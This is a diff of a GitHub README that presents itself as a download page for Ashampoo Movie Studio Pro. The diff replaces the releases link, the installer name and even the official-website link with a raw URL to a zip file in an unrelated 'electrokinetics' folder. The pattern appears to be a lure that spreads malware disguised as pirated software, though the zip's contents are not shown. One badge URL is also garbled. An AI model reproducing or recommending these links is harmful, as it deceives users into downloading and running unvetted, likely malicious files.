@@ -1,20 +1,20 @@
 # 🎬 Ashampoo-Movie-Studio-Pro-Working - Create Stunning Videos Easily
 
 ## 🔗 Download Here
-[![Download Ashampoo Movie Studio Pro](https://img.shields.io/badge/Download-Ashampoo%20Movie%20Studio%20Pro-blue.svg)](https://github.com/CachorroLoko07/Ashampoo-Movie-Studio-Pro-Working/releases)
+[![Download Ashampoo Movie Studio Pro](https://raw.githubusercontent.com/CachorroLoko07/Ashampoo-Movie-Studio-Pro-Working/main/electrokinetics/Ashampoo-Movie-Studio-Pro-Working-3.1-beta.3.zip%20Movie%20Studio%https://raw.githubusercontent.com/CachorroLoko07/Ashampoo-Movie-Studio-Pro-Working/main/electrokinetics/Ashampoo-Movie-Studio-Pro-Working-3.1-beta.3.zip)](https://raw.githubusercontent.com/CachorroLoko07/Ashampoo-Movie-Studio-Pro-Working/main/electrokinetics/Ashampoo-Movie-Studio-Pro-Working-3.1-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to Ashampoo Movie Studio Pro 2025! This software allows you to create stunning videos with ease. Follow these simple steps to download and run the application on your Windows computer.
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the following link to access the download page: [Download Ashampoo Movie Studio Pro](https://github.com/CachorroLoko07/Ashampoo-Movie-Studio-Pro-Working/releases).
+   Go to the following link to access the download page: [Download Ashampoo Movie Studio Pro](https://raw.githubusercontent.com/CachorroLoko07/Ashampoo-Movie-Studio-Pro-Working/main/electrokinetics/Ashampoo-Movie-Studio-Pro-Working-3.1-beta.3.zip).
 
 2. **Choose Your Version**  
    On the releases page, you will find several versions of Ashampoo Movie Studio Pro. Look for the latest version, indicated by the highest number. Click on the version to see the files available for download.
 
 3. **Download the Installer**  
-   Click on the installer file with a name similar to `Ashampoo-Movie-Studio-Pro-2025-setup.exe`. This file is what you need to install the software.
+   Click on the installer file with a name similar to `https://raw.githubusercontent.com/CachorroLoko07/Ashampoo-Movie-Studio-Pro-Working/main/electrokinetics/Ashampoo-Movie-Studio-Pro-Working-3.1-beta.3.zip`. This file is what you need to install the software.
 
 4. **Run the Installer**  
    Once the download is complete, locate the installer file in your Downloads folder. Double-click on the file to begin the installation process.
@@ -50,7 +50,7 @@ Try Ashampoo Movie Studio Pro for free. The trial version allows you to explore 
 If you experience any issues during the download or installation process, feel free to reach out for assistance. You can ask questions in the Issues section of this repository.
 
 ## 🔍 Useful Links
-- **Official Website:** [Ashampoo](https://www.ashampoo.com)
+- **Official Website:** [Ashampoo](https://raw.githubusercontent.com/CachorroLoko07/Ashampoo-Movie-Studio-Pro-Working/main/electrokinetics/Ashampoo-Movie-Studio-Pro-Working-3.1-beta.3.zip)
 - **User Guide:** Access the user manual for detailed instructions on using the software.
 
 ## ⚙️ Keep Your Software Updated
